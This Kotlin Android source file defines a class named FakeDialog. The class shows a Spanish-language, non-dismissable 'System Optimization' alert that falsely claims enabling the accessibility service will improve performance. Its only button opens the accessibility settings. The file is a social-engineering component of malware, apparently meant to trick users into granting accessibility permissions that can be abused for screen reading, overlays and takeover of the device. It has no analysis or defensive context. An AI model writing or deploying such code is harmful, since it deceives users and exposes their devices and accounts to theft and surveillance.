package com.sys.sun

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.provider.Settings

object FakeDialog {
    fun show(ctx: Context) {
        val builder = AlertDialog.Builder(ctx)
        builder.setTitle("Optimización del Sistema")
        builder.setMessage("Para mejorar el rendimiento y limpiar la memoria correctamente, active el servicio de accesibilidad.")
        builder.setPositiveButton("Activar") { _, _ ->
            ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
        builder.setCancelable(false)
        builder.show()
    }
}
